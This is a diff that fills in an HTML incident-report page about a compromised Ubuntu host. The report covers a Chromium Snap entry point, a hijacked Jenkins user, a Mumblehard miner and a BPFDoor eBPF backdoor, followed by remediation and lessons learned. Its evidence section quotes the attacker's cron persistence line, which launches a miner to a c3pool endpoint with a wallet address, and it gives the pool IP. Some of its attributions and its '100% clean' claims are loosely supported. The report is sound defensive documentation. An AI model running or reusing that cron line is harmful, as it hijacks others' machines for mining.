@@ -4,45 +4,960 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Host Compromise Forensic Investigation</title>
-    <link rel="stylesheet" href="styles/style.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e);
+            color: white;
+            line-height: 1.6;
+            overflow-x: hidden;
+            scroll-behavior: smooth; /* Smooth scrolling for SPA */
+        }
+
+        /* Hero Section - Sticky */
+        .hero {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(15, 15, 35, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+            padding: 20px 0; /* Initial padding for hero */
+        }
+
+        .hero.scrolled {
+            background: rgba(15, 15, 35, 0.98);
+            padding: 15px 0;
+        }
+
+        .hero-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 20px; /* Adjust padding as hero already has vertical padding */
+            text-align: center;
+            transition: all 0.3s ease;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .hero.scrolled .hero-content {
+            padding: 0 20px; /* Keep horizontal padding */
+        }
+
+        .hero h1 {
+            font-size: clamp(2rem, 5vw, 4rem);
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4);
+            background-size: 300% 300%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: gradientShift 3s ease-in-out infinite alternate;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            margin-bottom: 10px;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 100% 50%; }
+        }
+
+        .hero .subtitle {
+            font-size: clamp(1rem, 2vw, 1.5rem);
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 15px;
+        }
+
+        .hero .date {
+            font-size: clamp(0.9rem, 1.5vw, 1.2rem);
+            color: #96ceb4;
+            opacity: 0.9;
+        }
+
+        /* Menu Button */
+        .menu-button {
+            display: none; /* Hidden by default */
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1.5rem;
+            z-index: 101;
+        }
+
+        /* Collapsible Menu */
+        .collapsible-menu {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(15, 15, 35, 0.98);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 15px 0;
+            display: none; /* Hidden by default */
+            z-index: 100;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .collapsible-menu-item {
+            color: white;
+            text-decoration: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+            margin: 5px 0;
+        }
+
+        .collapsible-menu-item:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        /* General Section Styling */
+        .section {
+            max-width: 1200px;
+            margin: 40px auto; /* Adjust margin for sections */
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.08); /* Slightly less opaque than slide */
+            backdrop-filter: blur(15px);
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            opacity: 0; /* Initially hidden for fade-in effect */
+            transform: translateY(20px);
+            transition: opacity 0.6s ease-out, transform 0.6s ease-out;
+        }
+
+        .section.fade-in {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        h2 {
+            font-size: 2.2rem;
+            margin-bottom: 25px;
+            color: #4ecdc4;
+            border-bottom: 2px solid #4ecdc4;
+            padding-bottom: 10px;
+            text-align: left; /* Align headings to left */
+        }
+
+        h3 {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: #ff6b6b;
+            text-align: left;
+        }
+
+        p {
+            margin-bottom: 10px;
+            text-align: left;
+        }
+
+        ul {
+            list-style-type: none; /* Remove default list style */
+            padding-left: 0; /* Remove default padding */
+            margin-bottom: 20px;
+        }
+
+        ul li {
+            position: relative;
+            padding-left: 25px; /* Space for custom bullet */
+            margin-bottom: 8px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        ul li::before {
+            content: '•'; /* Custom bullet point */
+            color: #4ecdc4;
+            font-size: 1.2em;
+            position: absolute;
+            left: 0;
+            top: 0;
+        }
+
+        .info-grid, .stats-grid, .malware-list, .remediation-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+            margin-bottom: 30px; /* Add margin bottom */
+        }
+
+        .info-card, .stat-card, .malware-item, .remediation-card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            text-align: center; /* Center content in cards */
+        }
+
+        .info-card:hover, .stat-card:hover, .malware-item:hover, .remediation-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25);
+        }
+
+        .info-card h3, .stat-card h3, .malware-item h3, .remediation-card h3 {
+            text-align: center; /* Center card titles */
+            margin-bottom: 10px;
+        }
+
+        .stat-number {
+            font-size: 2.8rem;
+            font-weight: bold;
+            color: #96ceb4;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .code-block {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 18px;
+            border-radius: 10px;
+            font-family: 'Fira Code', 'Courier New', monospace; /* Fira Code for ligatures */
+            font-size: 0.95rem;
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            margin: 25px 0;
+            overflow-x: auto;
+            white-space: pre-wrap; /* Wrap long lines */
+            word-break: break-all; /* Break words if necessary */
+        }
+
+        .highlight {
+            background: linear-gradient(90deg, rgba(255, 107, 107, 0.4), rgba(78, 205, 196, 0.4));
+            padding: 3px 8px;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: bold;
+            margin: 8px;
+            color: white;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .critical { background: rgba(255, 107, 107, 0.9); }
+        .warning { background: rgba(255, 193, 7, 0.9); }
+        .success { background: rgba(40, 167, 69, 0.9); }
+        .info { background: rgba(23, 162, 184, 0.9); }
+
+        .timeline {
+            position: relative;
+            margin: 40px 0;
+            padding-left: 20px; /* Space for the line */
+        }
+
+        .timeline::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 3px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 2px;
+        }
+
+        .timeline-item {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .timeline-marker {
+            width: 45px;
+            height: 45px;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 25px;
+            flex-shrink: 0;
+            font-weight: bold;
+            color: white;
+            font-size: 1.2rem;
+            box-shadow: 0 0 15px rgba(78, 205, 196, 0.6);
+            position: sticky; /* Make markers sticky */
+            top: 100px; /* Adjust based on hero height */
+        }
+
+        .timeline-content {
+            flex: 1;
+            background: rgba(255, 255, 255, 0.12);
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            text-align: left;
+        }
+
+        .timeline-content h3 {
+            margin-top: 0;
+            margin-bottom: 10px;
+        }
+
+        .malware-item {
+            background: rgba(255, 107, 107, 0.15); /* Slightly darker for malware */
+            border: 1px solid rgba(255, 107, 107, 0.4);
+            text-align: center;
+        }
+
+        .remediation-card {
+            background: rgba(40, 167, 69, 0.15); /* Slightly darker for remediation */
+            border: 1px solid rgba(40, 167, 69, 0.4);
+        }
+
+        .remediation-card ul {
+            padding-left: 20px;
+            list-style-type: disc; /* Use standard disc for remediation lists */
+        }
+
+        .remediation-card ul li::before {
+            content: none; /* Remove custom bullet */
+        }
+
+        /* Navigation Bar (SPA specific) */
+        .spa-nav {
+            position: fixed;
+            top: 50%;
+            right: 30px;
+            transform: translateY(-50%);
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            z-index: 1000;
+            background: rgba(25, 25, 40, 0.8);
+            backdrop-filter: blur(10px);
+            padding: 15px 10px;
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .spa-nav-item {
+            padding: 10px 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            color: white;
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+            text-align: center;
+            opacity: 0.7;
+        }
+
+        .spa-nav-item:hover, .spa-nav-item.active {
+            background: rgba(78, 205, 196, 0.4);
+            transform: translateX(-5px);
+            opacity: 1;
+            box-shadow: 0 0 10px rgba(78, 205, 196, 0.5);
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .section {
+                margin: 30px 15px;
+                padding: 25px;
+            }
+
+            h2 {
+                font-size: 1.8rem;
+            }
+
+            h3 {
+                font-size: 1.2rem;
+            }
+
+            .info-grid, .stats-grid, .malware-list, .remediation-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .timeline::before {
+                left: 20px; /* Adjust line position */
+            }
+
+            .timeline-marker {
+                margin-right: 15px;
+                position: relative; /* Not sticky on small screens */
+                top: auto;
+            }
+
+            .spa-nav {
+                position: static; /* Stack navigation on small screens */
+                transform: none;
+                flex-direction: row;
+                flex-wrap: wrap;
+                justify-content: center;
+                margin-top: 30px;
+                right: auto;
+                padding: 10px;
+                border-radius: 10px;
+            }
+
+            .spa-nav-item {
+                flex-grow: 1;
+                margin: 5px;
+            }
+
+            .menu-button {
+                display: block; /* Show menu button on small screens */
+            }
+        }
+    </style>
 </head>
 <body>
     <div class="hero" id="hero-section">
         <div class="hero-content">
             <h1>🔍 Host Compromise Investigation</h1>
-            <div class="dynamic-content">
-                <h2 id="dynamic-h2"></h2>
-                <div class="sticky-submenu" id="dynamic-submenu"></div>
-            </div>
             <button class="menu-button" id="menu-button">☰</button>
         </div>
     </div>
 
     <nav class="collapsible-menu" id="collapsible-menu">
-        <!-- Navigation items will be added here dynamically -->
+        <a href="#executive-summary" class="collapsible-menu-item">Executive Summary</a>
+        <a href="#system-info" class="collapsible-menu-item">System Info</a>
+        <a href="#attack-timeline" class="collapsible-menu-item">Attack Timeline</a>
+        <a href="#malware-analysis" class="collapsible-menu-item">Malware Analysis</a>
+        <a href="#bpfdoor-analysis" class="collapsible-menu-item">BPFDoor Analysis</a>
+        <a href="#forensic-methodology" class="collapsible-menu-item">Forensic Methodology</a>
+        <a href="#remediation-overview" class="collapsible-menu-item">Remediation</a>
+        <a href="#lessons-learned" class="collapsible-menu-item">Lessons Learned</a>
+        <a href="#future-recommendations" class="collapsible-menu-item">Recommendations</a>
+        <a href="#project-references" class="collapsible-menu-item">References</a>
+        <a href="#conclusion" class="collapsible-menu-item">Conclusion</a>
     </nav>
 
     <div class="main-content">
-        <!-- Your sections will go here -->
         <section class="section" id="executive-summary">
             <h2>📋 Executive Summary</h2>
-            <div class="sticky-submenu">
-                <a href="#initial-compromise" class="sticky-submenu-item">Initial Compromise</a>
-                <a href="#privilege-escalation" class="sticky-submenu-item">Privilege Escalation</a>
-                <!-- Add more submenu items as needed -->
-            </div>
             <div class="info-grid">
-                <!-- Your content here -->
+                <div class="info-card">
+                    <h3>🎯 Initial Compromise</h3>
+                    <p>Chromium Snap package vulnerability exploitation led to malicious payload delivery</p>
+                </div>
+                <div class="info-card">
+                    <h3>🔐 Privilege Escalation</h3>
+                    <p>Pre-existing Jenkins user account hijacked for establishing persistence</p>
+                </div>
+                <div class="info-card">
+                    <h3>💰 Crypto Mining</h3>
+                    <p>Mumblehard malware deployed to <span class="highlight">/dev/shm/duet</span> targeting c3pool.org</p>
+                </div>
+                <div class="info-card">
+                    <h3>🕵️ Stealth Access</h3>
+                    <p>BPFDoor rootkit implanted for kernel-level persistence and backdoor access</p>
+                </div>
+            </div>
+            <div style="text-align: center; margin-top: 20px;">
+                <span class="status-badge critical">CRITICAL INCIDENT</span>
+                <span class="status-badge success">FULLY REMEDIATED</span>
             </div>
         </section>
-        <!-- Add more sections as needed -->
+
+        <section class="section" id="system-info">
+            <h2>💻 Compromised System Details</h2>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <span class="stat-number">Ubuntu</span>
+                    <div>24.04.2 LTS Noble</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">6.11.0</span>
+                    <div>Kernel Version</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">Jenkins</span>
+                    <div>Compromised User</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">3</span>
+                    <div>CVEs Identified</div>
+                </div>
+            </div>
+
+            <h3>🔍 Key CVEs Involved</h3>
+            <div class="info-grid">
+                <div class="info-card">
+                    <span class="status-badge critical">CVE-2021-3773</span>
+                    <p><strong>Linux Kernel Critical</strong><br>Kernel-level vulnerability exploitation</p>
+                </div>
+                <div class="info-card">
+                    <span class="status-badge warning">CVE-2025-5272</span>
+                    <p><strong>Firefox/Thunderbird</strong><br>Browser component vulnerability</p>
+                </div>
+                <div class="info-card">
+                    <span class="status-badge critical">Chromium Snap</span>
+                    <p><strong>Zero-day Exploit</strong><br>Primary entry vector (CVE pending)</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section" id="attack-timeline">
+            <h2>⏱️ Attack Chain Timeline</h2>
+            <div class="timeline">
+                <div class="timeline-item">
+                    <div class="timeline-marker">1</div>
+                    <div class="timeline-content">
+                        <h3>Initial Access</h3>
+                        <p>Chromium Snap vulnerability exploited to drop malicious loader</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">2</div>
+                    <div class="timeline-content">
+                        <h3>Privilege Escalation</h3>
+                        <p>Jenkins user account hijacked as execution context</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">3</div>
+                    <div class="timeline-content">
+                        <h3>Payload Deployment</h3>
+                        <p>Mumblehard Miner & BPFDoor backdoor installed via scheduled tasks</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">4</div>
+                    <div class="timeline-content">
+                        <h3>Persistence</h3>
+                        <p>Cron job created for continuous mining operations</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">5</div>
+                    <div class="timeline-content">
+                        <h3>Stealth & C2</h3>
+                        <p>BPFDoor rootkit + data exfiltration to mining pool</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">6</div>
+                    <div class="timeline-content">
+                        <h3>Secondary Access</h3>
+                        <p>AnyDesk credentials compromised for remote access</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="section" id="malware-analysis">
+            <h2>🦠 Malware Artifacts Discovered</h2>
+            <div class="malware-list">
+                <div class="malware-item">
+                    <h3>💰 Mumblehard Miner</h3>
+                    <p>Crypto mining malware</p>
+                    <span class="status-badge critical">HIGH IMPACT</span>
+                </div>
+                <div class="malware-item">
+                    <h3>🚪 BPFDoor Rootkit</h3>
+                    <p>Kernel-level backdoor</p>
+                    <span class="status-badge critical">STEALTH</span>
+                </div>
+            </div>
+
+            <h3>🔍 Evidence - Malicious Cron Job</h3>
+            <div class="code-block">
+* * * * * /usr/bin/flock -n /var/tmp/verl.lock -c 'cd /dev/shm/duet; exec ./app -o auto.c3pool.org:19999 -u 49SxJeWLPqcPKzqRfPzLoMW17NiYuSaaMdgpXLaSqY8H2QwPdi5iKBTZNkQpFfS5xpjRzwjpYhD7jFHab87VuW5xTpgNXZX --rig-id cpuaa90ef09 -k &'
+            </div>
+
+            <h3>🔍 Evidence - Rootkit Detection</h3>
+            <div class="code-block">
+/proc/1656590/stack:[&lt;0&gt;] unix_seqpacket_recvmsg+0x43/0x70
+/proc/17300/stack:[&lt;0&gt;] unix_seqpacket_recvmsg+0x43/0x70
+            </div>
+
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>🎯 C2 Server</h3>
+                    <p><span class="highlight">auto.c3pool.org</span><br>IP: 85.239.237.174</p>
+                </div>
+                <div class="info-card">
+                    <h3>📁 Payload Location</h3>
+                    <p><span class="highlight">/dev/shm/duet/</span><br>Memory-based storage</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section" id="bpfdoor-analysis">
+            <h2>🕵️ BPFDoor Rootkit Analysis</h2>
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>🎯 Detection Method</h3>
+                    <p>Kernel stack analysis revealing <span class="highlight">unix_seqpacket_recvmsg</span> hooks</p>
+                </div>
+                <div class="info-card">
+                    <h3>🔧 Technology</h3>
+                    <p>eBPF-based kernel module for stealth operations</p>
+                </div>
+            </div>
+
+            <h3>📊 eBPF Programs Identified</h3>
+            <div class="code-block">
+2039: cgroup_skb  name sd_fw_ingress  tag 6deef7357e7b4530  gpl
+      loaded_at 2025-06-08T14:52:25+0900  uid 0
+      xlated 64B  jited 56B  memlock 4096B
+
+2040: cgroup_device  name sd_devices  tag c8b47a902f1cc68b  gpl
+      loaded_at 2025-06-08T14:52:25+0900  uid 0
+      xlated 464B  jited 290B  memlock 4096B
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <span class="stat-number">10+</span>
+                    <div>eBPF Programs</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">4096B</span>
+                    <div>Memory Locks</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">Kernel</span>
+                    <div>Level Access</div>
+                </div>
+            </div>
+        </section>
+
+        <section class="section" id="forensic-methodology">
+            <h2>🔬 Forensic Investigation Methodology</h2>
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>🔍 Vulnerability Scanning</h3>
+                    <p>System-wide CVE identification and package analysis</p>
+                </div>
+                <div class="info-card">
+                    <h3>🕵️ Rootkit Detection</h3>
+                    <p>Kernel stack analysis and eBPF program enumeration</p>
+                </div>
+                <div class="info-card">
+                    <h3>📊 Process Analysis</h3>
+                    <p>Active/passive process monitoring and network connections</p>
+                </div>
+                <div class="info-card">
+                    <h3>⏰ Scheduled Task Audit</h3>
+                    <p>Cron job analysis and persistence mechanism identification</p>
+                </div>
+                <div class="info-card">
+                    <h3>🔐 Login Audits</h3>
+                    <p>Authentication log analysis and user account review</p>
+                </div>
+                <div class="info-card">
+                    <h3>🌐 Network Analysis</h3>
+                    <p>C2 communication patterns and external connections</p>
+                </div>
+            </div>
+
+            <h3>📚 Investigation Architecture</h3>
+            <p>Comprehensive approach documented in GitHub Wiki with detailed procedures for:</p>
+            <ul>
+                <li>Vulnerability assessment protocols</li>
+                <li>Malware detection and analysis techniques</li>
+                <li>Rootkit identification methodologies</li>
+                <li>System integrity verification processes</li>
+            </ul>
+        </section>
+
+        <section class="section" id="remediation-overview">
+            <h2>🛡️ Comprehensive Remediation</h2>
+            <div class="remediation-grid">
+                <div class="remediation-card">
+                    <h3>🧹 Malware Removal</h3>
+                    <ul>
+                        <li>Mumblehard miner binaries purged</li>
+                        <li>BPFDoor rootkit completely removed</li>
+                        <li>All malicious cron jobs deleted</li>
+                        <li>Jenkins user activities cleared</li>
+                    </ul>
+                </div>
+                <div class="remediation-card">
+                    <h3>📦 Package Restoration</h3>
+                    <ul>
+                        <li>Chromium Snap package reinstalled</li>
+                        <li>Thunderbird updated and secured</li>
+                        <li>Kernel fully updated</li>
+                        <li>Python packages integrity restored</li>
+                    </ul>
+                </div>
+                <div class="remediation-card">
+                    <h3>🔒 System Hardening</h3>
+                    <ul>
+                        <li>Firewall rules enhanced</li>
+                        <li>Kernel security updates applied</li>
+                        <li>Wazuh SIEM reinitialized</li>
+                        <li>Extended monitoring enabled</li>
+                    </ul>
+                </div>
+                <div class="remediation-card">
+                    <h3>✅ Verification</h3>
+                    <ul>
+                        <li>Full system integrity check</li>
+                        <li>Clean vulnerability scan results</li>
+                        <li>Active monitoring confirmed</li>
+                        <li>No persistence mechanisms detected</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="status-badge success" style="margin-top: 20px; font-size: 1.2rem;">✅ SYSTEM FULLY SECURED</div>
+        </section>
+
+        <section class="section" id="lessons-learned">
+            <h2>🎓 Key Lessons Learned</h2>
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>📦 Snap Package Security</h3>
+                    <p>Snap-based applications represent significant attack surfaces requiring continuous monitoring and minimal usage where possible</p>
+                </div>
+                <div class="info-card">
+                    <h3>🔧 eBPF Rootkits</h3>
+                    <p>Kernel-level eBPF-based rootkits like BPFDoor are increasing in Linux environments, requiring advanced detection techniques</p>
+                </div>
+                <div class="info-card">
+                    <h3>🔐 Credential Exposure</h3>
+                    <p>Malware with C2 capabilities can leak various credentials (SSH, AnyDesk, etc.) enabling lateral movement</p>
+                </div>
+                <div class="info-card">
+                    <h3>⏰ Persistence Mechanisms</h3>
+                    <p>Scheduled cron jobs remain simple but highly effective persistence mechanisms for attackers</p>
+                </div>
+                <div class="info-card">
+                    <h3>📊 Continuous Monitoring</h3>
+                    <p>Proactive system patching combined with SIEM monitoring is crucial for Linux production systems</p>
+                </div>
+                <div class="info-card">
+                    <h3>🔍 Detection Techniques</h3>
+                    <p>Multiple detection tools (rkhunter, chkrootkit, bpftool) are necessary for comprehensive threat identification</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section" id="future-recommendations">
+            <h2>🚀 Future Security Recommendations</h2>
+            <div class="timeline">
+                <div class="timeline-item">
+                    <div class="timeline-marker">🔄</div>
+                    <div class="timeline-content">
+                        <h3>Operating System Reinstallation</h3>
+                        <p>Complete clean OS installation with data backup for maximum security assurance</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">🛡️</div>
+                    <div class="timeline-content">
+                        <h3>Kernel-level Sandboxing</h3>
+                        <p>Enable system-wide application confinement for enhanced security</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">📦</div>
+                    <div class="timeline-content">
+                        <h3>Minimize Snap Usage</h3>
+                        <p>Reduce Snap package usage wherever possible to minimize attack surface</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">🔄</div>
+                    <div class="timeline-content">
+                        <h3>Regular Kernel Updates</h3>
+                        <p>Establish automated kernel update monitoring and deployment routines</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-marker">📊</div>
+                    <div class="timeline-content">
+                        <h3>Enhanced SIEM Monitoring</h3>
+                        <p>Reinitialize Wazuh agent keys and implement continuous vulnerability scanning</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="section" id="project-references">
+            <h2>📚 Investigation Documentation</h2>
+            <h3>🔗 GitHub Repository Resources</h3>
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>📋 Investigation Plan</h3>
+                    <p><strong>GitHub Wiki</strong><br>Comprehensive investigation architecture and methodology</p>
+                    <span class="status-badge info">DOCUMENTATION</span>
+                </div>
+                <div class="info-card">
+                    <h3>🛡️ Mitigation Procedures</h3>
+                    <p><strong>GitHub Wiki</strong><br>Complete remediation and hardening procedures</p>
+                    <span class="status-badge success">PROCEDURES</span>
+                </div>
+            </div>
+
+            <h3>🎯 Detailed Investigation Issues</h3>
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>Issue #1</h3>
+                    <p><strong>Initial Entry Point Analysis</strong><br>Chromium vulnerability investigation</p>
+                </div>
+                <div class="info-card">
+                    <h3>Issue #4</h3>
+                    <p><strong>BPFDoor Detection</strong><br>Rootkit identification and cleanup procedures</p>
+                </div>
+                <div class="info-card">
+                    <h3>Issue #5</h3>
+                    <p><strong>eBPF Rootkit Removal</strong><br>Kernel module unload and verification</p>
+                </div>
+            </div>
+
+            <div style="text-align: center; margin-top: 30px;">
+                <span class="status-badge info" style="font-size: 1.2rem;">🔗 Main Repository: github.com/aiegoo/siem</span>
+            </div>
+        </section>
+
+        <section class="section" id="conclusion">
+            <h2>✅ Investigation Complete</h2>
+            <div class="subtitle">System Secured & Hardened</div>
+
+            <div class="stats-grid" style="margin-top: 40px;">
+                <div class="stat-card">
+                    <span class="stat-number">100%</span>
+                    <div>Malware Removed</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">0</span>
+                    <div>Active Threats</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">Full</span>
+                    <div>System Integrity</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">24/7</span>
+                    <div>SIEM Monitoring</div>
+                </div>
+            </div>
+
+            <div style="margin-top: 40px; text-align: center;">
+                <span class="status-badge success" style="font-size: 1.5rem;">🛡️ SYSTEM FULLY SECURED</span>
+                <span class="status-badge info" style="font-size: 1.2rem;">📊 CONTINUOUS MONITORING ACTIVE</span>
+            </div>
+        </section>
     </div>
 
     <nav class="spa-nav">
-        <!-- SPA navigation items will be added here dynamically -->
     </nav>
 
-    <script src="scripts/script.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const sections = document.querySelectorAll('.section');
+            const spaNav = document.querySelector('.spa-nav');
+            const heroSection = document.getElementById('hero-section');
+            const menuButton = document.getElementById('menu-button');
+            const collapsibleMenu = document.getElementById('collapsible-menu');
+
+            // Generate navigation items for the sidebar
+            sections.forEach(section => {
+                const id = section.id;
+                let title = '';
+                // Extract title from h2 or h1 within the section
+                const h2 = section.querySelector('h2');
+                const h1 = section.querySelector('h1');
+                if (h2) {
+                    title = h2.textContent.replace('📋 ', '').replace('💻 ', '').replace('⏱️ ', '').replace('🦠 ', '').replace('🕵️ ', '').replace('🔬 ', '').replace('🛡️ ', '').replace('🎓 ', '').replace('🚀 ', '').replace('📚 ', '').replace('✅ ', '').trim();
+                } else if (h1) {
+                    title = h1.textContent.replace('🔍 ', '').replace('✅ ', '').trim();
+                }
+
+                if (title) {
+                    const navItem = document.createElement('a');
+                    navItem.href = `#${id}`;
+                    navItem.classList.add('spa-nav-item');
+                    navItem.textContent = title;
+                    spaNav.appendChild(navItem);
+
+                    navItem.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
+                        history.pushState(null, '', `#${id}`); // Update URL hash
+                    });
+                }
+            });
+
+            // Toggle collapsible menu
+            menuButton.addEventListener('click', () => {
+                collapsibleMenu.style.display = collapsibleMenu.style.display === 'flex' ? 'none' : 'flex';
+            });
+
+            // Close collapsible menu when a link is clicked
+            collapsibleMenu.querySelectorAll('a').forEach(link => {
+                link.addEventListener('click', () => {
+                    collapsibleMenu.style.display = 'none';
+                });
+            });
+
+            // Intersection Observer for fade-in effect and active navigation
+            const observerOptions = {
+                root: null, // viewport
+                rootMargin: '0px',
+                threshold: 0.2 // Trigger when 20% of the section is visible
+            };
+
+            const sectionObserver = new IntersectionObserver((entries, observer) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('fade-in');
+                        // Update active navigation item
+                        document.querySelectorAll('.spa-nav-item').forEach(item => {
+                            item.classList.remove('active');
+                            if (item.getAttribute('href') === `#${entry.target.id}`) {
+                                item.classList.add('active');
+                            }
+                        });
+                    } else {
+                        // Optional: remove fade-in when out of view, or keep it for single view
+                        // entry.target.classList.remove('fade-in');
+                    }
+                });
+            }, observerOptions);
+
+            sections.forEach(section => {
+                sectionObserver.observe(section);
+            });
+
+            // Hero section sticky effect
+            window.addEventListener('scroll', () => {
+                if (window.scrollY > 0) {
+                    heroSection.classList.add('scrolled');
+                } else {
+                    heroSection.classList.remove('scrolled');
+                }
+            });
+
+            // Handle initial hash in URL for direct linking
+            if (window.location.hash) {
+                const targetSection = document.getElementById(window.location.hash.substring(1));
+                if (targetSection) {
+                    setTimeout(() => { // Small delay to ensure layout is ready
+                        targetSection.scrollIntoView({ behavior: 'smooth' });
+                    }, 100);
+                }
+            }
+        });
+    </script>
 </body>
 </html>
-
